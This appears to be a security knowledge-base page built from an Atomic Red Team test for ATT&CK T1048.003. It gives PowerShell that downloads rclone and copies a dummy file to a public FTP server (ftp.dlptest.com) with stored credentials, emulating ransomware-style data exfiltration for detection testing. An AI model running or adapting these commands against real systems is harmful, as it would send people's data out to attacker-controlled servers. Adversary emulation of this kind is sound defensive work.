---
atomic_guid: "b854eb97-bf9b-45ab-a1b5-b94e4880c56b"
title: "Exfiltration Over Alternative Protocol - FTP - Rclone"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048.003"
attack_technique_name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "b854eb97-bf9b-45ab-a1b5-b94e4880c56b"
  - "Exfiltration Over Alternative Protocol - FTP - Rclone"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Exfiltration Over Alternative Protocol - FTP - Rclone

Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.
[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)

## Metadata

- Atomic GUID: b854eb97-bf9b-45ab-a1b5-b94e4880c56b
- Technique: T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1048.003/T1048.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048.003]]

## Input Arguments

### ftp_pass

- description: Your FTP user's password
- type: string
- default: rNrKYTX9g7z3RgJRmxWuGHbeu

### ftp_port

- description: Your FTP's port
- type: integer
- default: 21

### ftp_server

- description: Your own ftp server
- type: string
- default: ftp.dlptest.com

### ftp_user

- description: Your FTP username
- type: string
- default: dlpuser

## Dependencies

Check if the exfil package exists

### Prerequisite Check

```powershell
if (Test-Path C:\Users\Public\Downloads\exfil.zip) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
fsutil file createnew C:\Users\Public\Downloads\exfil.zip 20485760
```

Check if rclone zip exists

### Prerequisite Check

```powershell
if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip" -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"
Expand-Archive C:\Users\Public\Downloads\rclone-current-windows-amd64.zip -DestinationPath C:\Users\Public\Downloads\
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName
$exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "exfil.zip" | Select-Object -ExpandProperty FullName
&$rclone_bin config create ftpserver "ftp" "host" #{ftp_server} "port" #{ftp_port} "user" #{ftp_user} "pass" #{ftp_pass}
&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml)
